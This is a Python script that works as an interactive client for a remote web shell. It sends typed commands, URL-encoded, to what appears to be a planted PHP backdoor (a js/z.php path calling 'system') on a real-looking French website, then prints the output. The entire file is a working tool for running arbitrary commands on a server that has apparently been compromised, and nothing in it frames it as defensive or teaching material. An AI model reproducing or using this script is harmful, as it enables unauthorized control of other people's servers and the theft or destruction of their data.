#!/usr/bin/env python3
import requests
import urllib.parse

# Base URL (change if needed)
BASE_URL = "https://www.ecluzelles.fr/js/z.php?d=system&dd="

def run_command(cmd: str) -> str:
    """Send command to remote system and return output."""
    url = BASE_URL + urllib.parse.quote(cmd)
    try:
        r = requests.get(url, timeout=10)
        r.raise_for_status()
        return r.text.strip()
    except Exception as e:
        return f"[ERROR] {e}"

def main():
    print("Remote Web Shell (type 'exit' to quit)")
    while True:
        try:
            cmd = input("$ ").strip()
            if cmd.lower() in ["exit", "quit"]:
                print("Bye.")
                break
            if not cmd:
                continue
            output = run_command(cmd)
            print(output)
        except (KeyboardInterrupt, EOFError):
            print("\nBye.")
            break

if __name__ == "__main__":
    main()
